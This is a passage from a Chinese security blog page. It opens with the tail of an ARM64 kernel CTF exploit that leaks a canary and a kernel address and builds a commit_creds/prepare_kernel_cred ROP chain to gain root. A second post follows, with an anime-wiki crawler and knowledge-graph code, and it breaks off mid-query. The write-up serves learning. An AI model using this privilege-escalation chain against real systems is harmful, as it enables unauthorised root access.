class="number">0x200</span>);</span><br><span class="line">    canary = buf[<span class="number">12</span>];</span><br><span class="line">    kernel_addr = buf[<span class="number">2</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;canary: 0x%llx\n&quot;</span>,canary);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel_addr: 0x%llx\n&quot;</span>,kernel_addr);</span><br><span class="line"></span><br><span class="line">    offset = kernel_addr - <span class="number">0xffff8000082376f8</span>; </span><br><span class="line">	kernel_base = <span class="number">0xffff800008000000</span> + offset; </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel_base: 0x%lx\n&quot;</span>,kernel_base);</span><br><span class="line"></span><br><span class="line">    commit_creds = commit_creds + offset;</span><br><span class="line">    prepare_kernel_cred = prepare_kernel_cred + offset;</span><br><span class="line"></span><br><span class="line">    gadget1 = gadget1 + offset;</span><br><span class="line">    gadget2 = gadget2 + offset;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;gadget1: 0x%lx\n&quot;</span>,gadget1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;gadget2: 0x%lx\n&quot;</span>,gadget2);</span><br><span class="line">    <span class="comment">//sleep(2);</span></span><br><span class="line"></span><br><span class="line">    buf[<span class="number">16</span>] = canary;</span><br><span class="line"></span><br><span class="line">    buf[<span class="number">18</span>] = gadget2;</span><br><span class="line">    buf[<span class="number">22</span>] = prepare_kernel_cred+<span class="number">4</span>; <span class="comment">// X19</span></span><br><span class="line">    buf[<span class="number">26</span>] = <span class="number">0</span>;</span><br><span class="line">    buf[<span class="number">32</span>] = commit_creds+<span class="number">4</span>;       <span class="comment">// X30</span></span><br><span class="line"></span><br><span class="line">    buf[<span class="number">36</span>] = gadget2;</span><br><span class="line">    buf[<span class="number">42</span>] = gadget1;</span><br><span class="line"></span><br><span class="line">    buf[<span class="number">45</span>] = get_root;</span><br><span class="line">    buf[<span class="number">46</span>] = <span class="number">0x80001000</span>;</span><br><span class="line">    buf[<span class="number">47</span>] = buf;</span><br><span class="line">    </span><br><span class="line">    write(fd, buf, <span class="number">0x200</span>);</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>第一次打 ARM 的内核题目，调试很久找不到 gadget，最后的 gadget 还是抄的别人的</p>
<p>太菜了，现在找 gadget 还很迷茫，以后有经验了再总结吧</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/12/%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1%E5%AE%9E%E8%B7%B5%E9%A1%B9%E7%9B%AE%E4%B8%89/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/12/%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1%E5%AE%9E%E8%B7%B5%E9%A1%B9%E7%9B%AE%E4%B8%89/" class="post-title-link" itemprop="url">知识图谱实践项目三</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-03-12 16:05:44 / Modified: 18:04:39" itemprop="dateCreated datePublished" datetime="2023-03-12T16:05:44+08:00">2023-03-12</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge-Graph/" itemprop="url" rel="index"><span itemprop="name">Knowledge Graph</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>16k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>15 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="知识图谱实践项目三"><a href="#知识图谱实践项目三" class="headerlink" title="知识图谱实践项目三"></a>知识图谱实践项目三</h2><p>这次爬取的目标是：<a target="_blank" rel="noopener" href="https://www.bnacg.com/">二次元动漫百科 - 白鸟ACG (bnacg.com)</a> （想做一个番剧知识图谱）</p>
<p>爬虫代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> requests, re</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urljoin, urlencode</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crawler</span>:</span></span><br><span class="line">    target_url = <span class="string">&#x27;https://www.bnacg.com/dm/list_1_&#x27;</span></span><br><span class="line">    base_url = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    name_file = <span class="number">0</span></span><br><span class="line">    platform_file = <span class="number">0</span></span><br><span class="line">    seiyuu_file = <span class="number">0</span></span><br><span class="line">    classify_file = <span class="number">0</span></span><br><span class="line">    role_name_file = <span class="number">0</span></span><br><span class="line">    role_img_file = <span class="number">0</span></span><br><span class="line">    author_file = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_base_html</span>(<span class="params">self,url</span>):</span></span><br><span class="line">        res = requests.get(url,headers)</span><br><span class="line">        text = res.text.encode(<span class="string">&#x27;ISO-8859-1&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">create_list</span>(<span class="params">self</span>):</span></span><br><span class="line">        base_html = self.get_base_html(self.base_url)</span><br><span class="line">        soup = BeautifulSoup(base_html, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">        html = soup.findAll(<span class="string">&quot;ul&quot;</span>, &#123;<span class="string">&quot;class&quot;</span>: <span class="string">&quot;result-list&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">        url_list = re.findall(<span class="string">&#x27;&lt;a class=&quot;img-wrap&quot; href=&quot;(.*?)&quot; rel=&quot;nofollow&quot;&#x27;</span>, <span class="built_in">str</span>(html))</span><br><span class="line"></span><br><span class="line">        name_list = []</span><br><span class="line">        author_list = []</span><br><span class="line">        role_img_list = []</span><br><span class="line">        role_name_list = []</span><br><span class="line">        classify_list = []</span><br><span class="line">        seiyuu_list =[]</span><br><span class="line">        platform_list = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> url_list:</span><br><span class="line">            url_html = self.get_base_html(url)</span><br><span class="line">            soup = BeautifulSoup(url_html, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">            name = re.findall(<span class="string">&#x27;&lt;div class=&quot;ts18 bold&quot;&gt; (.*?) /&#x27;</span>, <span class="built_in">str</span>(url_html))</span><br><span class="line">            classify = re.findall(<span class="string">&#x27;&lt;div class=&quot;rw_ju&quot;&gt; &lt;span class=&quot;bold&quot;&gt;类型：&lt;/span&gt;(.*?)&lt;/div&gt;&#x27;</span>,url_html)</span><br><span class="line">            role_name = re.findall(<span class="string">&#x27;title=&quot;(.*?)&quot; alt=&quot;&#x27;</span>,url_html)</span><br><span class="line">            role_img = re.findall(<span class="string">&#x27;&lt;img src=&quot;(.*?)&quot; title=&quot;&#x27;</span>,url_html)</span><br><span class="line">            seiyuu = re.findall(<span class="string">&#x27;&lt;div class=&quot;rw_ju&quot;&gt; &lt;span class=&quot;bold&quot;&gt;人物配音：&lt;/span&gt;(.*?)&lt;/div&gt;&#x27;</span>,url_html)</span><br><span class="line">            author = re.findall(<span class="string">&#x27;&lt;dd class=&quot;canshu value&quot;&gt;(.*?)&lt;/dd&gt;&#x27;</span>,url_html)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(role_name)):</span><br><span class="line">                role_name[i] = <span class="built_in">str</span>(role_name[i]).replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">            name_list.append(name[<span class="number">0</span>])</span><br><span class="line">            role_img_list.append(role_img[<span class="number">1</span>:])</span><br><span class="line">            role_name_list.append(role_name)</span><br><span class="line">            author_list.append(author[<span class="number">2</span>])</span><br><span class="line">            platform_list.append(author[<span class="number">3</span>])</span><br><span class="line">            seiyuu_list.append(seiyuu)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">len</span>(classify) != <span class="number">0</span>):</span><br><span class="line">                classify_list.append(classify[<span class="number">0</span>].split(<span class="string">&#x27;,&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment">#for i in list(zip(name_list,author_list,platform_list,classify_list,seiyuu_list,role_name_list,role_img_list)):</span></span><br><span class="line">            <span class="comment">#print(i)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">len</span>(role_img_list[i])!=<span class="built_in">len</span>(role_img_list[i])):</span><br><span class="line">                <span class="built_in">print</span>(role_img_list[i])</span><br><span class="line">                <span class="built_in">print</span>(role_name_list[i])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(name_list)):</span><br><span class="line">            self.name_file.write(<span class="built_in">str</span>(name_list[i].replace(<span class="string">&#x27;《&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;》&#x27;</span>, <span class="string">&#x27;&#x27;</span>)) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            self.author_file.write(<span class="built_in">str</span>(author_list[i].replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>)) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            self.platform_file.write(<span class="built_in">str</span>(platform_list[i].replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>)) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            self.classify_file.write(<span class="built_in">str</span>(classify_list[i])[<span class="number">1</span>:-<span class="number">1</span>].replace(<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;&#x27;</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            self.seiyuu_file.write(<span class="built_in">str</span>(seiyuu_list[i])[<span class="number">1</span>:-<span class="number">1</span>].replace(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;&#x27;</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            self.role_name_file.write(<span class="built_in">str</span>(role_name_list[i])[<span class="number">1</span>:-<span class="number">1</span>].replace(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;&#x27;</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            self.role_img_file.write(<span class="built_in">str</span>(role_img_list[i])[<span class="number">1</span>:-<span class="number">1</span>].replace(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;&#x27;</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.name_file = <span class="built_in">open</span>(<span class="string">&#x27;data/name.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.author_file = <span class="built_in">open</span>(<span class="string">&#x27;data/author.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.role_name_file = <span class="built_in">open</span>(<span class="string">&#x27;data/role_name.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.role_img_file = <span class="built_in">open</span>(<span class="string">&#x27;data/role_img.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.platform_file = <span class="built_in">open</span>(<span class="string">&#x27;data/platform.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.seiyuu_file = <span class="built_in">open</span>(<span class="string">&#x27;data/seiyuu.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.classify_file = <span class="built_in">open</span>(<span class="string">&#x27;data/classify.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">            self.base_url = self.target_url + <span class="built_in">str</span>(i+<span class="number">1</span>) + <span class="string">&quot;.html&quot;</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Now is: &quot;</span> + self.base_url)</span><br><span class="line">            self.create_list()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test</span>(<span class="params">self</span>):</span></span><br><span class="line">        res = requests.get(self.target_url, headers)</span><br><span class="line">        <span class="built_in">print</span>(res.encoding)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    cra = Crawler()</span><br><span class="line">    cra.run()</span><br></pre></td></tr></table></figure>
<p>构建知识图谱的代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> py2neo <span class="keyword">import</span> Graph,Node,Relationship</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">classification = [<span class="string">&#x27;番剧名称&#x27;</span>,<span class="string">&#x27;番剧类型&#x27;</span>,<span class="string">&#x27;角色列表&#x27;</span>,<span class="string">&#x27;声优列表&#x27;</span>,<span class="string">&#x27;播放平台&#x27;</span>,<span class="string">&#x27;制作公司&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KG</span>:</span></span><br><span class="line">    name_file = <span class="built_in">open</span>(<span class="string">&#x27;data/name.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    platform_file = <span class="built_in">open</span>(<span class="string">&#x27;data/platform.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    author_file = <span class="built_in">open</span>(<span class="string">&#x27;data/author.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    role_img_file = <span class="built_in">open</span>(<span class="string">&#x27;data/role_img.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    role_name_file = <span class="built_in">open</span>(<span class="string">&#x27;data/role_name.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    seiyuu_file = <span class="built_in">open</span>(<span class="string">&#x27;data/seiyuu.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    classify_file = <span class="built_in">open</span>(<span class="string">&#x27;data/classify.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">createEntity</span>(<span class="params">self,graph</span>):</span></span><br><span class="line">        cql = <span class="string">&#x27;&#x27;&#x27;CREATE (n:番剧数据库&#123;id:&#x27;0&#x27;, name:&#x27;番剧数据库&#x27;&#125;) RETURN n&#x27;&#x27;&#x27;</span></span><br><span class="line">        graph.run(cql)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(classification):</span><br><span class="line">            cql = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">                MERGE (a:番剧数据库&#123;id:&#x27;%d&#x27;, name:&#x27;%s&#x27;&#125;)</span></span><br><span class="line"><span class="string">                MERGE (b &#123;name: &#x27;番剧数据库&#x27;&#125;) </span></span><br><span class="line"><span class="string">                MERGE (b)-[:划分]-&gt;(a)</span></span><br><span class="line"><span class="string">                &#x27;&#x27;&#x27;</span> % (i+<span class="number">1</span>, c)</span><br><span class="line">            graph.run(cql)</span><br><span class="line"></span><br><span class="line">        name_list = self.name_file.readlines()</span><br><span class="line">        author_list = self.author_file.readlines()</span><br><span class="line">        platform_list = self.platform_file.readlines()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(name_list)):</span><br><span class="line">            cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                MERGE (:番剧名称&#123;id:&#x27;%d&#x27;,名称:&quot;%s&quot;&#125;)</span></span><br><span class="line"><span class="string">                &quot;&quot;&quot;</span> % (i, name_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">            graph.run(cql)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;step 1 down&quot;</span>)</span><br><span class="line"></span><br><span class="line">        author_tmp_list = []</span><br><span class="line">        platform_tmp_list = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(name_list)):</span><br><span class="line">            <span class="keyword">if</span> author_list[i] <span class="keyword">not</span> <span class="keyword">in</span> author_tmp_list:</span><br><span class="line">                author_tmp_list.append(author_list[i])</span><br><span class="line">                cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                    MERGE (:制作公司&#123;id:&#x27;%d&#x27;, 名称:&quot;%s&quot;&#125;)</span></span><br><span class="line"><span class="string">                    &quot;&quot;&quot;</span> % (i, author_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">                graph.run(cql)</span><br><span class="line">            <span class="keyword">if</span> platform_list[i] <span class="keyword">not</span> <span class="keyword">in</span> platform_tmp_list:</span><br><span class="line">                platform_tmp_list.append(platform_list[i])</span><br><span class="line">                cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                    MERGE (:播放平台&#123;id:&#x27;%d&#x27;, 名称:&quot;%s&quot;&#125;)</span></span><br><span class="line"><span class="string">                    &quot;&quot;&quot;</span> % (i, platform_list[i].replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">                graph.run(cql)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;step 2 down&quot;</span>)</span><br><span class="line"></span><br><span class="line">        classify_tmp_list = []</span><br><span class="line">        seiyuu_tmp_list = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(name_list)):</span><br><span class="line">            classify_list = self.classify_file.readline().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            seiyuu_list = self.seiyuu_file.readline().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            role_name_list = self.role_name_file.readline().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            role_img_list = self.role_img_file.readline().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(classify_list)):</span><br><span class="line">                <span class="keyword">if</span> classify_list[j] <span class="keyword">not</span> <span class="keyword">in</span> classify_tmp_list:</span><br><span class="line">                    classify_tmp_list.append(classify_list[j])</span><br><span class="line">                    cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                        MERGE (:番剧类型&#123;类型:&#x27;%s&#x27;&#125;)</span></span><br><span class="line"><span class="string">                        &quot;&quot;&quot;</span> % (classify_list[j].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">                    graph.run(cql)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(seiyuu_list)):</span><br><span class="line">                <span class="keyword">if</span> seiyuu_list[j] <span class="keyword">not</span> <span class="keyword">in</span> seiyuu_tmp_list:</span><br><span class="line">                    seiyuu_tmp_list.append(seiyuu_list[j])</span><br><span class="line">                    cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                        MERGE (:声优列表&#123;名称:&#x27;%s&#x27;&#125;)</span></span><br><span class="line"><span class="string">                        &quot;&quot;&quot;</span> % (seiyuu_list[j].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">                    graph.run(cql)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(role_name_list)):</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">len</span>(role_name_list)!=<span class="built_in">len</span>(role_img_list)):</span><br><span class="line">                    <span class="built_in">print</span>(role_name_list[j])</span><br><span class="line">                    <span class="built_in">print</span>(role_img_list[j])</span><br><span class="line">                cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                    MERGE 